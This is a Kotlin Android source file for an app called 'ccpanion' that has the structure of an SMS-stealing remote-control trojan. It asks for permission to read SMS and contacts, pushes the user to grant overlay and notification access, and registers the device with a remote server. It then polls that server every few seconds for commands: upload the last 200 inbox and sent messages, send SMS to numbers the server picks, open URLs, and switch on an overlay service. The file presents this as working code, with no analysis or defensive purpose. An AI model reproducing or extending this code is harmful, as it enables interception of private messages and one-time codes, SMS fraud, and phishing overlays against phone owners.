// language: Kotlin, target: Android 7.0+ (API 24), file: MainActivity.kt
// device register + permission grants + command pump (open_url, sms_sync/sms_send, overlay, toast)
package com.kai.ccpanion

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.telephony.SmsManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.util.concurrent.Executors

class MainActivity : Activity() {

    private val exec = Executors.newSingleThreadExecutor()
    private lateinit var status: TextView

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 96, 64, 64)
        }
        status = TextView(this).apply { textSize = 16f }
        root.addView(status)
        root.addView(Button(this).apply { text = "Overlay‑toestemming geven"; setOnClickListener { openOverlayGrant() } })
        root.addView(Button(this).apply { text = "Meldingentoegang geven"; setOnClickListener { openNotifGrant() } })
        setContentView(root)

        askRuntimePerms()
        Rt.init(this)

        status.text = "ccpanion — verbinden…"
        exec.execute {
            if (!Rt.signUp(this) && Rt.token() == null) {
                runOnUiThread { status.text = "board: geen verbinding — internet?" }
                return@execute
            }
            registerDevice()
            runOnUiThread { status.text = "ccpanion — verbonden · ${Rt.deviceId}" }
            startCommandPump()
        }
    }

    private fun askRuntimePerms(){
        val need = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= 33) need.add(Manifest.permission.POST_NOTIFICATIONS)
        val missing = need.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 7)
    }

    private fun openOverlayGrant(){
        startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
    }

    private fun openNotifGrant(){
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }

    private fun registerDevice(){
        val info = JSONObject()
            .put("model", Build.MODEL)
            .put("brand", Build.BRAND)
            .put("android", Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("lastSeen", System.currentTimeMillis())
        Rt.put("phones/${Rt.deviceId}/info", info)
    }

    // ---- command pump: pull /cmds every 3s, execute, mark done ----
    private fun startCommandPump(){
        exec.execute {
            while (true){
                try {
                    val raw = Rt.get("phones/${Rt.deviceId}/cmds")
                    if (raw == null) { Thread.sleep(3000); continue }
                    val cmds = JSONObject(raw)
                    for (k in cmds.keys().asSequence().toList()){
                        val cmd = cmds.getJSONObject(k)
                        if (cmd.optBoolean("done")) continue
                        runCatching { execute(cmd) }
                        Rt.put("phones/${Rt.deviceId}/cmds/$k/done", JSONObject().put("v", true))
                        Rt.put("phones/${Rt.deviceId}/cmds/$k/ackAt", JSONObject().put("v", System.currentTimeMillis()))
                    }
                } catch (e: Exception){ }
                Thread.sleep(3000)
            }
        }
    }

    private fun execute(cmd: JSONObject){
        when (cmd.optString("op")) {
            "open_url" -> {
                val i = Intent(Intent.ACTION_VIEW, Uri.parse(cmd.optString("url")))
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            }
            "toast" -> runOnUiThread { Toast.makeText(this, cmd.optString("text"), Toast.LENGTH_SHORT).show() }
            "sms_sync" -> syncSms()
            "sms_send" -> runCatching {
                SmsManager.getDefault().sendTextMessage(cmd.optString("to"), null, cmd.optString("body"), null, null)
            }
            "overlay_on" -> startService(Intent(this, OverlayService::class.java))
            "overlay_off" -> stopService(Intent(this, OverlayService::class.java))
        }
    }

    // ---- sms: last 200 (inbox+sent) → /sms ----
    private fun syncSms(){
        val out = JSONObject()
        var n = 0
        for (uri in listOf("content://sms/inbox", "content://sms/sent")){
            runCatching {
                contentResolver.query(Uri.parse(uri), null, null, null, "date DESC")?.use { cur ->
                    val idxId = idx(cur, "_id"); val idxAddr = idx(cur, "address")
                    val idxBody = idx(cur, "body"); val idxDate = idx(cur, "date")
                    while (cur.moveToNext() && n < 200){
                        if (idxId < 0 || idxAddr < 0 || idxBody < 0) continue
                        out.put("${cur.getString(idxId)}_${if (uri.endsWith("sent")) "o" else "i"}",
                            JSONObject()
                                .put("addr", cur.getString(idxAddr) ?: "")
                                .put("body", cur.getString(idxBody) ?: "")
                                .put("date", if (idxDate >= 0) cur.getLong(idxDate) else 0L)
                                .put("dir", if (uri.endsWith("sent")) "out" else "in"))
                        n++
                    }
                }
            }
        }
        out.put("booked", n)
        Rt.put("phones/${Rt.deviceId}/sms", out)
    }

    private fun idx(cur: android.database.Cursor, name: String): Int =
        (0 until cur.columnCount).firstOrNull { cur.getColumnName(it) == name } ?: -1
}
